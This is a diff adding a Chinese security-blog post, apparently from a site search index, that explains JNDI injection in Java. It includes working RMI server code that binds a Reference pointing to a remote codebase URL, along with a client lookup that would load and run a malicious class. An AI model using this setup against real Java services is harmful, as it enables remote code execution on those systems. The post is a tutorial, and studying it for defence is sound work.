@@ -208,4 +208,36 @@
         <tag>fastjson</tag>
       </tags>
   </entry>
+  <entry>
+    <title>JNDI注入</title>
+    <url>/2021/10/03/jndi%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="什么是-JNDI"><a href="#什么是-JNDI" class="headerlink" title="什么是 JNDI"></a>什么是 JNDI</h2><p>简单来说，JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
+<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI</p>
+<p>总之就是，可以通过JNDI接口查找指定名称对应的东西。</p>
+<h2 id="Reference含义："><a href="#Reference含义：" class="headerlink" title="Reference含义："></a>Reference含义：</h2><p>引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。</p>
+<p>Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Reference类</span></span><br><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;FactoryClassName&quot;</span>, <span class="string">&quot;http://xxx.com:12345/&quot;</span>);<span class="comment">//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名</span></span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
+
+<p>当有客户端通过 lookup(“refObj”)获取远程对象时，获得到一个 Reference类的存根，由于获取的是一个 Reference类的实例，客户端会首先去本地的 CLASSPATH去寻找被标识为 refClassName的类，如果本地未找到，则会去请求 <a href="http://xxx.com:12345/FactoryClassName.class">http://xxx.com:12345/FactoryClassName.class</a> 加载工厂类。</p>
+<h2 id="JNDI注入攻击过程"><a href="#JNDI注入攻击过程" class="headerlink" title="JNDI注入攻击过程"></a>JNDI注入攻击过程</h2><ol>
+<li>RMI服务端获取HTTP服务上的引用对象，利用 ReferenceWrapper 包装之后绑定在了 Registry 上</li>
+<li>JNDI客户端通过指定名称获取RMI服务端的引用对象</li>
+<li>客户端获取到之后利用 getObjectFactoryFromReference 方法对 ReferenceWrapper  stub进行了还原 获取到了 Reference 类</li>
+<li>Reference类中的codebase url 远程获取了恶意类并且进行了实例化从而在客户端触发了恶意代码</li>
+</ol>
+<h2 id="代码案例"><a href="#代码案例" class="headerlink" title="代码案例"></a>代码案例</h2><p>恶意的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建RMI Registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;java RMI registry created. port on 9999...&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建引用对象</span></span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;ExportObject&quot;</span>, <span class="string">&quot;com.longofo.remoteclass.ExportObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 使用ReferenceWrapper类对Reference类或其子类对象进行远程包装使其能够被远程访问，客户端可以访问该引用。</span></span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        <span class="comment">// 绑定引用</span></span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端请求：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, NamingException </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://localhost:9999/refObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>JNDI</tag>
+      </tags>
+  </entry>
 </search>
